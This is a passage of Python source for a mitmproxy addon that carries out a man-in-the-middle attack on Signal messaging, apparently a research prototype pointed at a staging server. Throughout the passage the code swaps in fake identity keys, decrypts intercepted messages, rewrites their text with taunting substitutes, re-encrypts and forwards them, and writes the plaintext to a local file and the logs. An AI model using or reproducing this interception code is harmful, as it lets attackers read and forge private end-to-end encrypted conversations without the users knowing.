    logging.info(f"content: {content}")  #### TODO: what's happening here? No injection of fake identity key
    # TODO: right now we are altering a "pseudo-flow" -- one we created artificially from a websocket message.
    # ideally, we will propagate this further by checking if the flow was altered by the handler auto-magically.
    flow.response.content = json.dumps(content).encode()
    return flow.response.content


def _v1_ws_message(flow, identifier):
    logging.info(f"message: {identifier}")
    logging.info(f"message: {flow.request.content}")

    req = json.loads(flow.request.content)
    ip_address = flow.client_conn.address[0]

    logging.info(f"ws message content: {req}")

    destination_user = req["destination"]

    identifier, destination = utils.strip_uuid_and_id(destination_user)

    logging.warning(conversation_session.keys())

    session: (MitmUser, MitmUser) = conversation_session.get(f"{ip_address}:{destination}")

    if session:
        fakeVictim: MitmUser = session[0]
        fakeUser: MitmUser = session[1]
    else:
        # logging.error(f"Session not found for {ip_address} and {destination}")
        return

    logging.warning(f"SESSION: {session}")

    for msg in req["messages"]:
        if msg["destinationDeviceId"] != 1:
            logging.error("Secondary devices are not supported as the developer was not paid enough. C.f. my Twint ;)")

        envelope_type = EnvelopeType(int(msg['type']))
        logging.warning(f"MESSAGE (Envelope) TYPE: {envelope_type}")

        if envelope_type not in [EnvelopeType.PRE_KEY_BUNDLE]:
            logging.warning(f"Only PREKEY_BUNDLE is supported at the moment, got {envelope_type}. C.f. my Twint ;)")
            continue

        content = b64decode(msg["content"])

        msg_type = EnvelopeType(int(msg["type"]))

        from protos.gen.SignalService_pb2 import Content

        if msg_type == EnvelopeType.PRE_KEY_BUNDLE:
            try:
                # fixme: fakeUser should start a session with the ProtocolAddress of the VICTIM, NOT THE DESTINATION
                dec: Content = fakeUser.decrypt(ProtocolAddress(destination, msg["destinationDeviceId"]), content)
                logging.warning(f"DECRYPTION IS:\n{dec}")
            except Exception as e:
                logging.warning(f"DECRYPTION FAILED: {e}")
                logging.warning(f"RAW content: {content}")
                return  # no point trying to re-encrypt

            try:
                if dec.typingMessage.timestamp == 0:
                    # not a timestamp message
                    out_msg = f"bist du ein 🐿️? -- От судьбы не уйти.!\n[orig msg was: {dec.dataMessage.body}]\nPowered by SCION\n(https://www.youtube.com/watch?v=CzXJ0i4xABI)".encode()
                    # if b"pizza" in dec.dataMessage.body:
                    out_msg = f"Do you want to do crimes ^^ ? 🔪🥷🏿 ".encode()
                    to_enc = Content()
                    to_enc.CopyFrom(dec)
                    to_enc.dataMessage.body = out_msg

                    with open("conversation.txt", "w+") as f:
                        f.write(f"<ORIGINAL_OUTGOING_MESSAGE>{dec.dataMessage.body}</ORIGINAL_OUTGOING_MESSAGE>")
                        f.write(f"<OUTGOING_MESSAGE>{out_msg}</OUTGOING_MESSAGE>")
                else:
                    to_enc = Content()
                    to_enc.CopyFrom(dec)

                enc: CiphertextMessage = fakeVictim.encrypt(ProtocolAddress(destination_user, 1),
                                                            to_enc.SerializeToString())
                logging.info(f"Created CTXT: {enc}")
                logging.warning(f"NEW ENCRYPTION (type - {enc.message_type()}): {enc}")
                msg["content"] = b64encode(enc.serialize()).decode()
                logging.warning(
                    f"DEBUG for fakeVictim ({fakeVictim.registration_id}):\naddr: {fakeVictim.address}\nSPK:{fakeVictim.store.all_signed_pre_key_ids()}")
                logging.warning(f"content {msg['content']}")
            except Exception as e:
                logging.warning(f"ENCRYPTION FAILED: {e}")
    logging.warning(f"Sending the json on the wire: {json.dumps(req)}")
    return json.dumps(req)


def decap_ws_msg(orig_flow: HTTPFlow, ws_msg, rtype=RouteType.REQUEST):
    f = HTTPFlow(client_conn=orig_flow.client_conn, server_conn=orig_flow.server_conn)

    if rtype == RouteType.REQUEST:
        ws_msg: WebSocketRequestMessage
        # todo: handle headers
        f.request = Request(host=orig_flow.request.host, port=orig_flow.request.port,
                            scheme=orig_flow.request.scheme.encode(),
                            method=ws_msg.verb.upper().encode(),
                            authority=orig_flow.request.authority.encode(),
                            http_version=orig_flow.request.http_version.encode(),
                            trailers=None, timestamp_start=orig_flow.request.timestamp_start,
                            timestamp_end=orig_flow.request.timestamp_end,
                            path=ws_msg.path.encode(), headers=Headers(), content=ws_msg.body)
    else:
        ws_msg: WebSocketResponseMessage
        # todo: handle headeers + reason
        f.response = Response(http_version=orig_flow.response.http_version.encode(), status_code=getattr(ws_msg, 'status', 200), reason=b"id: ",
                      headers=Headers(), content=ws_msg.body, trailers=None,
                      timestamp_start=orig_flow.response.timestamp_start,
                      timestamp_end=orig_flow.response.timestamp_end)
    return f


def v1_api_message(flow: HTTPFlow):
    ########## MASSIVE HACK
    session = conversation_session[
        list(conversation_session.keys())[0]
    ]
    fakeVictim: MitmUser = session[0]
    fakeUser: MitmUser = session[1]
    #############

    logging.warning(flow)
    envelope = Envelope()
    envelope.ParseFromString(flow.request.content)

    if envelope.type == Envelope.RECEIPT and len(envelope.content) == 0:
        return flow.request.content

    ####### Another massive hack :/
    device: Device = Device.get()
    user: User = User.get()
    ############

    failed = False

    from signal_protocol.state import SignedPreKeyRecord, SignedPreKeyId
    fakeVictim.signed_pre_key_id = SignedPreKeyId(fakeUser.signed_pre_key_id.get_id())
    # fakeVictim.signed_pre_key_pair = fakeUser.signed_pre_key_pair
    # fakeVictim.signed_pre_key_signature = fakeUser.signed_pre_key_signature

    fakeVictim.store.save_signed_pre_key(fakeVictim.signed_pre_key_id, SignedPreKeyRecord(
        fakeVictim.signed_pre_key_id,
        int(time.time()),
        fakeVictim.signed_pre_key_pair,
        fakeVictim.signed_pre_key_signature
    ))

    try:
        result = sealed_sender_decrypt(envelope.content, TRUST_ROOT_STAGING_PK, int(time.time()), str(user.pNumber),
                                   str(device.aci), DeviceId(1), fakeVictim.store)
        content = Content()
        content.ParseFromString(utils.PushTransportDetails.get_stripped_padding_message_body(result.message()))
        data, pni_signature = content.dataMessage, content.pniSignatureMessage
        flags = dataMessageFlags(content.dataMessage.flags)

        logging.warning(f"v SEALED SENDER DECRYPTION v"
                        f"{result}"
                        f"uuid: {result.sender_uuid()}"
                        f"device_id: {result.device_id}"
                        f"e164: {result.sender_e164()}"
                        f"data: {data}"
                        f"(flags): {flags}"
                        f"pniSignature: {pni_signature}"
                        "^ SEALED SENDER DECRYPTION ^")

        ## TODO: verify the pni Message
        ##
        ##
        to_enc = Content()
        data_message = DataMessage()
        data_message.body = f"You got 📩.\n[original '{data.body}']\nYou are being MITM'ed sucker 👀 ^^\n\nP.S Let's do CRIME! 🌈🌈".encode()
        data_message.body = f"{data.body}.\nLet's hug some 🐈‍⬛🐈‍⬛🐈‍⬛ instead?".encode()

        data_message.timestamp = data.timestamp
        data_message.requiredProtocolVersion = data.requiredProtocolVersion
        data_message.profileKey = b""
        to_enc.dataMessage.CopyFrom(data_message)

        ## todo: fakeVictim should have the address of real victim
        enc: CiphertextMessage = fakeUser.encrypt(ProtocolAddress("79ed01b1-19e4-4b2f-b260-662630c39912", 1),
                                                    to_enc.SerializeToString())
        # todo: fix this when fakeUser is initialized properly

        logging.info(f"Created CTXT: {enc}")
        logging.warning(f"NEW ENCRYPTION (type - {enc.message_type()}): {enc}")
        # data_message.body =
        # to_enc.dataMessage =
        # to_enc.dataMessage.

        out_envelope = Envelope()
        out_envelope.CopyFrom(envelope)
        out_envelope.type = Envelope.CIPHERTEXT
        out_envelope.content = enc.serialize()
        out_envelope.sourceDevice = 1
        out_envelope.sourceServiceId = f"PNI:79ed01b1-19e4-4b2f-b260-662630c39912"

        with open("conversation.txt", "w+") as f:
            f.write(f"<ORIGINAL_INCOMING_MESSAGE>{data.body}</ORIGINAL_INCOMING_MESSAGE>")
            f.write(f"<INCOMING_MESSAGE>{data_message.body}</INCOMING_MESSAGE>")

        # flow.request.content =
        return out_envelope.SerializeToString()
        # envelope.content =

    except Exception as e:
        logging.warning(f"DECRYPTION FAILED: no sealed sender :c if used fakeVictim (correct) \n\t{e}")

    return None


ws_resp = Router()

ws_resp.add_route(HOST_HTTPBIN, parse.Parser("/v1/profile/{identifier}/{version}/{credentialRequest}"), HTTPVerb.ANY,
                  _v1_ws_my_profile, None)
ws_resp.add_route(HOST_HTTPBIN, parse.Parser("/v1/profile/{identifier}/{version}"), HTTPVerb.ANY, _v1_ws_profile_futut,
                  None)
ws_resp.add_route(HOST_HTTPBIN, parse.Parser("/v1/profile/{identifier}"), HTTPVerb.ANY, _v1_ws_profile, None)
ws_resp.add_route(HOST_HTTPBIN, parse.Parser("/v1/keepalive"), HTTPVerb.ANY, lambda x: None, None)
ws_resp.add_route(HOST_HTTPBIN, parse.Parser("/api/v1/message"), HTTPVerb.ANY, v1_api_message, None)

ws_req = Router()
ws_req.add_route(HOST_HTTPBIN, parse.Parser("/v1/messages/{identifier}"), HTTPVerb.ANY, _v1_ws_message, None)
ws_req.add_route(HOST_HTTPBIN, parse.Parser("/v1/keepalive"), HTTPVerb.ANY, lambda x: None, None)
ws_req.add_route(HOST_HTTPBIN, parse.Parser("/api/v1/message"), HTTPVerb.ANY, v1_api_message, None)


def unwarp_websocket(ws: mitmproxy.websocket.WebSocketMessage) -> Union[
    WebSocketRequestMessage | WebSocketResponseMessage | WebSocketMessage]:
    msg = WebSocketMessage()
    msg.ParseFromString(ws.content)
    if msg.type == WebSocketMessage.UNKNOWN:
        logging.debug(f"Couldn't figure out a more specific type, returning {msg}")
        return msg
    if msg.type == WebSocketMessage.REQUEST:
        return msg.request
    return msg.response


@api.ws_route("/v1/websocket/", rtype=RouteType.REQUEST)
def _v1_websocket_req(flow: HTTPFlow, msg):
    if msg.injected:
        logging.warning(f"Message already injected... skipping ^^ {msg}")
        return

    ws_msg = unwarp_websocket(msg)
    logging.debug(f"WEBSOCKET (c2s): {ws_msg}")
    msg.injected = True

    id = ws_msg.id
    if websocket_open_state.get(id):
        logging.warning(f"Message request already exists for id {id}")
        # case when this is actually a response to a s2c request
        path = websocket_open_state[ws_msg.id].request.path
    else:
        websocket_open_state[id] = PendingWebSocket()
        websocket_open_state[ws_msg.id].request = ws_msg
        path = ws_msg.path

    host = flow.request.pretty_host if flow.live else HOST_HTTPBIN
    if "signal" not in host:
        host = HOST_HTTPBIN  # this shouldn't be needed but just to be safe ^^

    f = decap_ws_msg(flow, ws_msg)
    handler, params, _ = ws_req.find_handler(host, path)
    logging.debug(f"HANDLER (req): {handler}, PARAMS: {params} -- {host} / {path}")

    if "messages" in path:
        assert handler is not None, f"something went terriblu: {path}"
    if handler:
        msg.injected = True
        req = handler(f, *params.fixed, **params.named)
        if req:
            if isinstance(req, str):
                req = req.encode()
            # msg. = resp
            new_ws = WebSocketMessage()
            new_ws.ParseFromString(msg.content)
            new_ws.request.body = req
            msg.content = new_ws.SerializeToString()


@api.ws_route("/v1/websocket/", rtype=RouteType.RESPONSE)
def _v1_websocket_resp(flow: HTTPFlow, msg):
    if msg.injected:
        logging.warning(f"Message already injected... skipping ^^ {msg}")
        return
    ws_msg = unwarp_websocket(msg)
    logging.debug(f"WEBSOCKET (s2c): {ws_msg}")
    msg.injected = True

    id = ws_msg.id

    if not websocket_open_state.get(id):
        logging.debug(f"Message request does not exist for id {id}: {len(ws_msg.body)}")
        # return
        websocket_open_state[id].request = ws_msg

    path = websocket_open_state[id].request.path

    websocket_open_state[id].response = ws_msg
    logging.debug(f"Websocket resp with id {id} and path {path}")

    host = flow.request.pretty_host if flow.live else HOST_HTTPBIN
    if "signal" not in host:
        host = HOST_HTTPBIN  # this shouldn't be needed but just to be safe ^^

    ## TODO: this approach might be fundamentally wrong -- thinking of them as request/responses
    ## since for example /api/v1/message is a REQUEST sent by the server
    ## A refactor to DIRECTION (c2s / s2c) instead of RouteType might make more sense...
    f = decap_ws_msg(flow, ws_msg, RouteType.RESPONSE) if "/api/v1/message" not in path \
        else decap_ws_msg(flow, ws_msg, RouteType.REQUEST) ## TODO: trust the websocket message info instead of direction flow
    handler, params, _ = ws_resp.find_handler(host, path)
    logging.warning(f"HANDLER (resp): {handler}, PARAMS: {params} -- {host} / {path}")

    if "profile" in path:
        assert handler is not None, f"something went terriblu: {path}"
    if handler:
        msg.injected = True
        resp = handler(f, *params.fixed, **params.named)
        if resp:
            new_ws = WebSocketMessage()
            new_ws.ParseFromString(msg.content)
            if new_ws.type == WebSocketMessage.RESPONSE:
                new_ws.response.body = resp
            elif new_ws.type == WebSocketMessage.REQUEST:
                new_ws.request.body = resp
            msg.content = new_ws.SerializeToString()


addons = [api]

from mitmproxy.tools.main import mitmdump

if __name__ == "__main__":

    flow_name = f"debug_{int(time.time())}.flow"
    f = open(REGISTRATION_INFO_PATH, "wb")
    f.write(b"{}")
    f.close()

    params = [
        # "-q",   # quiet flag, only script's output
        "--mode",
        "transparent",
        "--showhost",
        "--ssl-insecure",
        "--ignore-hosts",
        config.IGNORE_HOSTS,
        "-s",  # script flag
        __file__,  # use the same file as the hook
        # "-r",
        # "mitmproxy_flows/PQ_registration"
        "-w",
        flow_name
    ]
    mitmdump(params)